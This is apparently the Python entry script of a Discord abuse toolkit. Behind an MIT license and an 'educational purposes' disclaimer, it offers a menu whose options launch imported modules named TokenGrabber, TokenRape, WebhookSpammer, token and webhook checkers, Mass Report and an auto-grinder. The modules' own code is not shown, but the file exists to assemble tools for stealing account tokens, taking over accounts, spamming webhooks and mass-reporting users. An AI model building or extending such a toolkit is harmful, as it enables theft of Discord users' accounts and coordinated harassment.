LICNECE = """
Copyright © 2021 Hyydra ᴴᴰ#0001
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import time
import os

print(LICNECE)

time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')

try:
    import time
    import os
    from colored import fg, bg, attr
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.autoBump as bumper
    import modules.dankMemer as memer
    import modules.serverLookup as serverLookup
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()


r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "8" : {"function" : memer.start, "name" : "Dank memer grinder"},
            "9" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
            "10" : {"function" : massReport.start, "name" : "Mass Report"},
            "11" : {"function" : exit, "name" : "Exit"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f""" {r2} █████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2} ██████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2}██{b}╗{r2}██{b}╗{r2}  ██{b}╗{r2}
 ██{b}╔══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}╔═══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}╔╝{r2}
 ███████{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║ ╚{r2}███{b}╔╝{r2}
 ██{b}╔══{r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║ {r2}██{b}╔{r2}██{b}╗{r2}
 ██{b}║  {r2}██{b}║{r2}██{b}║ ╚{r2}████{b}║╚{r2}██████{b}╔╝{r2}██{b}║ ╚{r2}████{b}║{r2}██{b}║{r2}██{b}╔╝ {r2}██{b}╗{r2}
 {b}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{r2} * DISCLAIMR: This script is made for           *
 * educational purporses and the developers     *
 * assume no liabilaty and are not responsible  *
 * for any misuse or damages caused by the      *
 * script                                       *
""")
        indx = 0
        for key, val in self.modules.items():
            num = f"{r2}[{b}{key}{r2}]"
            print(
                f" {num:<6} {val['name']:<{20 if int(key) < 10 else 19}}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1


        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]

        data["function"]()

        input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
